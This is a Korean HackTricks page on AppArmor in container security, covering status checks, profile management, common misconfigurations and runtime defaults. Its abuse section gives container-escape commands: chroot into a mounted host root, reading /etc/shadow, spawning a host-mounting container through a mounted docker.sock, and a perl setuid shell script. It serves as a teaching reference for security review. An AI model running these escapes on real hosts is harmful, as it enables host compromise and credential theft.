# AppArmor

{{#include ../../../../banners/hacktricks-training.md}}

## 개요

AppArmor는 프로세그램별 프로파일을 통해 제약을 적용하는 **Mandatory Access Control** 시스템이다. 사용자 및 그룹 소유권에 크게 의존하는 전통적인 DAC 검사와 달리, AppArmor는 kernel이 프로세스 자체에 연결된 정책을 강제하도록 허용한다. container 환경에서는 workload가 전통적인 권한으로 어떤 동작을 시도할 수 있을 만큼 권한이 있어도, AppArmor 프로파일이 관련 path, mount, network 동작 또는 capability 사용을 허용하지 않으면 그 동작이 거부될 수 있기 때문에 중요하다.

가장 중요한 개념적 포인트는 AppArmor가 **path-based**라는 점이다. AppArmor는 SELinux가 라벨을 통해 접근을 판단하는 것과 달리 path 규칙을 통해 파일시스템 접근을 판단한다. 이는 접근이 쉽고 강력하다는 장점이 있지만, bind mounts와 대체 path 레이아웃에 대해 세심한 주의가 필요하다는 의미이기도 하다. 동일한 호스트 콘텐츠가 다른 path로 접근 가능해지면, 정책의 효과가 운영자가 처음 예상한 것과 달라질 수 있다.

## Container Isolation에서의 역할

Container 보안 검토는 종종 capabilities와 seccomp에서 멈추지만, AppArmor는 이러한 검사 이후에도 중요하다. 권한이 과도하게 부여된 container나 운영상 이유로 하나의 추가 capability가 필요한 workload를 가정해보라. AppArmor는 여전히 파일 접근, mount 동작, networking, 실행 패턴을 제약하여 명백한 악용 경로를 차단할 수 있다. 이 때문에 애플리케이션을 동작시키기 위해 AppArmor를 비활성화하는 것은 단순히 위험한 구성(risky configuration)을 실제로 악용 가능한 상태로 조용히 바꿀 수 있다.

## 실습

호스트에서 AppArmor가 활성화되어 있는지 확인하려면 다음을 사용하세요:
```bash
aa-status 2>/dev/null || apparmor_status 2>/dev/null
cat /sys/module/apparmor/parameters/enabled 2>/dev/null
```
현재 컨테이너 프로세스가 어떤 사용자로 실행되고 있는지 확인하려면:
```bash
docker run --rm ubuntu:24.04 cat /proc/self/attr/current
docker run --rm --security-opt apparmor=unconfined ubuntu:24.04 cat /proc/self/attr/current
```
그 차이는 유익하다. 일반적인 경우, 프로세스는 runtime이 선택한 프로필에 연결된 AppArmor 컨텍스트를 보여야 한다. unconfined인 경우에는 그 추가적인 제한 계층이 사라진다.

Docker가 적용했다고 생각하는 내용을 확인할 수도 있다:
```bash
docker inspect <container> | jq '.[0].AppArmorProfile'
```
## 런타임 사용

Docker는 호스트가 이를 지원할 때 기본 또는 사용자 정의 AppArmor 프로필을 적용할 수 있다. Podman도 AppArmor 기반 시스템에서 AppArmor와 통합될 수 있지만, SELinux 중심 배포판에서는 다른 MAC 시스템이 주로 사용된다. Kubernetes는 실제로 AppArmor를 지원하는 노드에서 워크로드 수준으로 AppArmor 정책을 노출할 수 있다. LXC와 관련된 Ubuntu 계열의 system-container 환경들도 AppArmor를 광범위하게 사용한다.

실무적으로 중요한 점은 AppArmor가 "Docker 기능"이 아니라는 것이다. 여러 런타임이 선택적으로 적용할 수 있는 호스트-커널 기능이다. 호스트가 이를 지원하지 않거나 런타임이 unconfined로 실행되도록 설정되면, 그 보호는 실제로 존재하지 않는다.

Docker-capable AppArmor 호스트에서는 가장 잘 알려진 기본 프로필이 `docker-default`이다. 이 프로필은 Moby의 AppArmor 템플릿에서 생성되며, 일부 capability 기반 PoC가 기본 컨테이너에서 여전히 실패하는 이유를 설명해주기 때문에 중요하다. 넓게 말하면, `docker-default`는 일반적인 네트워킹을 허용하고, `/proc`의 상당 부분에 대한 쓰기를 거부하며, `/sys`의 민감한 부분에 대한 접근을 차단하고, 마운트 작업을 차단하며, ptrace를 제한하여 일반적인 호스트 탐침 수단이 되지 않도록 한다. 이러한 기준선을 이해하면 "컨테이너가 `CAP_SYS_ADMIN`을 가지고 있다"와 "컨테이너가 실제로 내가 관심 있는 커널 인터페이스에 대해 그 capability를 사용할 수 있다"를 구분하는 데 도움이 된다.

## 프로필 관리

AppArmor 프로필은 일반적으로 `/etc/apparmor.d/` 아래에 저장된다. 일반적인 네이밍 관례는 실행 파일 경로의 슬래시를 점(.)으로 대체하는 것이다. 예를 들어 `/usr/bin/man`에 대한 프로필은 일반적으로 `/etc/apparmor.d/usr.bin.man`에 저장된다. 이 세부사항은 방어와 평가 모두에서 중요하다. 활성 프로필 이름을 알게 되면 호스트에서 해당 파일을 빠르게 찾을 수 있기 때문이다.

유용한 호스트 측 관리 명령어는 다음과 같다:
```bash
aa-status
aa-enforce
aa-complain
apparmor_parser
aa-genprof
aa-logprof
aa-mergeprof
```
이 명령들이 container-security 레퍼런스에서 중요한 이유는, 프로필이 실제로 어떻게 빌드되고 로드되며 complain mode로 전환되고 애플리케이션 변경 후 어떻게 수정되는지를 설명해 주기 때문이다. 운영자가 문제 해결 중에 프로필을 complain mode로 옮긴 뒤 enforcement를 복원하는 것을 잊어버리는 습관이 있다면, 문서상에는 컨테이너가 보호된 것처럼 보이지만 실제로는 훨씬 더 느슨하게 동작할 수 있다.

### 프로필 빌드 및 업데이트

`aa-genprof`는 애플리케이션 동작을 관찰하고 대화식으로 프로필 생성에 도움을 준다:
```bash
sudo aa-genprof /path/to/binary
/path/to/binary
```
`aa-easyprof`는 나중에 `apparmor_parser`로 로드할 수 있는 템플릿 프로파일을 생성할 수 있습니다:
```bash
sudo aa-easyprof /path/to/binary
sudo apparmor_parser -a /etc/apparmor.d/path.to.binary
```
바이너리가 변경되어 정책을 업데이트해야 할 때, `aa-logprof`는 로그에서 발견된 거부 항목을 재생하여 운영자가 이를 허용할지 거부할지 결정하는 데 도움을 줄 수 있습니다:
```bash
sudo aa-logprof
```
### Logs

AppArmor 거부 항목은 종종 `auditd`, syslog 또는 `aa-notify`와 같은 도구를 통해 확인할 수 있습니다:
```bash
sudo aa-notify -s 1 -v
```
이는 운영상 및 공격적으로 유용하다. 수비측은 이를 이용해 profiles를 정제한다. 공격자는 어떤 정확한 path 또는 operation이 거부되는지, 그리고 AppArmor가 exploit chain을 차단하는 control인지 여부를 파악하는 데 이용한다.

### 정확한 Profile File 식별

runtime이 container에 대해 특정 AppArmor profile 이름을 표시할 때, 해당 이름을 디스크상의 profile file로 매핑하는 것이 종종 유용하다:
```bash
docker inspect <container> | grep AppArmorProfile
find /etc/apparmor.d/ -maxdepth 1 -name '*<profile-name>*' 2>/dev/null
```
이는 특히 호스트 측 검토에서 유용합니다. 컨테이너가 "the container says it is running under profile `lowpriv`"라고 말하는 것과 "the actual rules live in this specific file that can be audited or reloaded"라는 사실 사이의 간극을 연결해 주기 때문입니다.

## 잘못된 구성

가장 명백한 실수는 `apparmor=unconfined`입니다. 관리자는 profile이 위험하거나 예기치 않은 것을 올바르게 차단해서 애플리케이션이 실패했을 때 디버깅 목적으로 이를 설정하는 경우가 많습니다. 해당 플래그가 운영 환경에 남아 있으면 전체 MAC 계층이 사실상 제거된 것입니다.

또 다른 미묘한 문제는 파일 권한이 정상으로 보인다고 bind mounts가 무해하다고 가정하는 것입니다. AppArmor는 path-based이기 때문에 호스트 경로를 다른 마운트 위치로 노출하면 path 규칙과 충돌을 일으킬 수 있습니다. 세 번째 실수는 config file에 있는 profile name이 호스트 커널이 실제로 AppArmor를 강제하지 않는다면 거의 의미가 없다는 점을 잊는 것입니다.

## 악용

AppArmor가 제거되면 이전에 제약되던 작업들이 갑자기 가능해질 수 있습니다: bind mounts를 통해 민감한 경로를 읽거나, procfs 또는 sysfs의 일부에 접근하거나, capabilities/seccomp가 허용하는 경우 mount 관련 동작을 수행하거나, profile이 보통 거부하는 경로를 사용하는 등의 경우가 있습니다. AppArmor는 종종 왜 a capability-based breakout attempt이 문서상으로는 "should work"하지만 실제로는 실패하는지를 설명하는 메커니즘입니다. AppArmor를 제거하면 동일한 시도가 성공하기 시작할 수 있습니다.

AppArmor가 path-traversal, bind-mount, 또는 mount-based abuse 체인을 막는 주된 원인이라고 의심되면, 첫 번째 단계는 profile이 있을 때와 없을 때 접근 가능한 것이 어떻게 달라지는지 비교하는 것입니다. 예를 들어 호스트 경로가 컨테이너 내부에 마운트되어 있다면, 먼저 해당 경로를 traverse하고 읽을 수 있는지 확인하세요:
```bash
cat /proc/self/attr/current
find /host -maxdepth 2 -ls 2>/dev/null | head
find /host/etc -maxdepth 1 -type f 2>/dev/null | head
```
컨테이너에 `CAP_SYS_ADMIN` 같은 위험한 capability가 있는 경우, 가장 실용적인 테스트 중 하나는 AppArmor가 mount 작업 또는 민감한 커널 파일시스템 접근을 차단하는 제어인지 확인하는 것입니다:
```bash
capsh --print | grep cap_sys_admin
mount | head
mkdir -p /tmp/testmnt
mount -t proc proc /tmp/testmnt 2>/dev/null || echo "mount blocked"
mount -t tmpfs tmpfs /tmp/testmnt 2>/dev/null || echo "tmpfs blocked"
```
host path가 이미 bind mount를 통해 사용 가능한 환경에서는, AppArmor를 잃으면 read-only information-disclosure issue가 직접적인 host file access로 전환될 수도 있습니다:
```bash
ls -la /host/root 2>/dev/null
cat /host/etc/shadow 2>/dev/null | head
find /host/var/run -maxdepth 2 -name '*.sock' 2>/dev/null
```
이 명령들의 요점은 AppArmor 자체만으로 breakout을 만든다는 것이 아니다. AppArmor가 제거되면 많은 filesystem 및 mount-based abuse paths가 즉시 테스트 가능해진다는 것이다.

### 전체 예시: AppArmor Disabled + Host Root Mounted

container에 이미 host root가 `/host`에 bind-mounted되어 있다면, AppArmor를 제거하면 차단된 filesystem abuse path를 완전한 host escape로 바꿀 수 있다:
```bash
cat /proc/self/attr/current
ls -la /host
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
shell이 host filesystem을 통해 실행되면, workload는 사실상 container boundary를 탈출한 것이다:
```bash
id
hostname
cat /etc/shadow | head
```
### 전체 예시: AppArmor 비활성화 + Runtime Socket

실제 방어벽이 런타임 상태를 둘러싼 AppArmor였다면, 마운트된 socket 하나로 완전한 탈출이 가능할 수 있습니다:
```bash
find /host/run /host/var/run -maxdepth 2 -name docker.sock 2>/dev/null
docker -H unix:///host/var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
정확한 경로는 마운트 지점에 따라 다르지만, 최종 결과는 동일합니다: AppArmor는 더 이상 runtime API에 대한 접근을 차단하지 않으며, runtime API는 호스트를 침해할 수 있는 container를 실행할 수 있습니다.

### 전체 예제: Path-Based Bind-Mount Bypass

AppArmor는 경로 기반이기 때문에, `/proc/**`를 보호하는 것이 동일한 호스트 procfs 내용을 다른 경로를 통해 접근할 수 있을 때 자동으로 보호해 주는 것은 아닙니다:
```bash
mount | grep '/host/proc'
find /host/proc/sys -maxdepth 3 -type f 2>/dev/null | head -n 20
cat /host/proc/sys/kernel/core_pattern 2>/dev/null
```
영향은 정확히 무엇이 마운트되어 있는지와 대체 경로가 다른 제어들도 bypass하는지 여부에 따라 다르지만, 이 패턴은 AppArmor를 고립적으로 평가하는 대신 마운트 레이아웃과 함께 평가해야 하는 가장 분명한 이유 중 하나다.

### 전체 예제: Shebang Bypass

AppArmor 정책은 때때로 인터프리터 경로를 대상으로 삼아 shebang 처리로 인한 스크립트 실행을 완전히 고려하지 못하는 방식으로 구성된다. 역사적인 예로는 첫 번째 줄이 제한된 인터프리터를 가리키는 스크립트를 사용하는 경우가 있다:
```bash
cat <<'EOF' > /tmp/test.pl
#!/usr/bin/perl
use POSIX qw(setuid);
POSIX::setuid(0);
exec "/bin/sh";
EOF
chmod +x /tmp/test.pl
/tmp/test.pl
```
이와 같은 예시는 profile의 의도와 실제 실행 의미가 달라질 수 있음을 상기시키는 데 중요합니다. container 환경에서 AppArmor를 검토할 때, interpreter chains와 alternate execution paths는 특별한 주의를 필요로 합니다.

## Checks

이 점검의 목적은 세 가지 질문에 빠르게 답하는 것입니다: 호스트에서 AppArmor가 활성화되어 있는가, 현재 프로세스가 confined되어 있는가, 그리고 runtime이 실제로 이 container에 profile을 적용했는가?
```bash
cat /proc/self/attr/current                         # Current AppArmor label for this process
aa-status 2>/dev/null                              # Host-wide AppArmor status and loaded/enforced profiles
docker inspect <container> | jq '.[0].AppArmorProfile'   # Profile the runtime says it applied
find /etc/apparmor.d -maxdepth 1 -type f 2>/dev/null | head -n 50   # Host-side profile inventory when visible
```
무엇이 흥미로운가:

- If `/proc/self/attr/current` shows `unconfined`, the workload is not benefiting from AppArmor confinement.
- If `aa-status` shows AppArmor disabled or not loaded, any profile name in the runtime config is mostly cosmetic.
- If `docker inspect` shows `unconfined` or an unexpected custom profile, that is often the reason a filesystem or mount-based abuse path works.

운영상의 이유로 컨테이너가 이미 권한 상승된 상태라면, AppArmor를 활성화 상태로 두는 것이 통제된 예외와 훨씬 더 광범위한 보안 실패를 구분하는 경우가 많습니다.

## 런타임 기본값

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | AppArmor를 지원하는 호스트에서 기본적으로 활성화됨 | 재정의되지 않으면 `docker-default` AppArmor 프로파일을 사용함 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Podman | 호스트에 따라 다름 | `--security-opt`를 통해 AppArmor를 지원하지만, 정확한 기본값은 호스트/런타임에 따라 다르며 Docker의 문서화된 `docker-default` 프로파일만큼 보편적이지 않습니다 | `--security-opt apparmor=unconfined`, `--security-opt apparmor=<profile>`, `--privileged` |
| Kubernetes | 조건부 기본값 | `appArmorProfile.type`이 지정되지 않으면 기본값은 `RuntimeDefault`이지만, 노드에서 AppArmor가 활성화된 경우에만 적용됩니다 | `securityContext.appArmorProfile.type: Unconfined`, `securityContext.appArmorProfile.type: Localhost`(약한 프로파일), AppArmor를 지원하지 않는 노드 |
| containerd / CRI-O (Kubernetes 환경) | 노드/런타임 지원을 따름 | 일반적으로 Kubernetes에서 지원하는 런타임들은 AppArmor를 지원하지만, 실제 강제 적용은 여전히 노드의 지원 여부와 워크로드 설정에 달려 있습니다 | Kubernetes 행과 동일; 직접 런타임 구성으로 AppArmor를 완전히 건너뛸 수도 있습니다 |

AppArmor의 경우 가장 중요한 변수는 종종 런타임뿐 아니라 **호스트**입니다. 매니페스트의 프로파일 설정은 AppArmor가 활성화되지 않은 노드에서는 격리를 생성하지 않습니다.
{{#include ../../../../banners/hacktricks-training.md}}
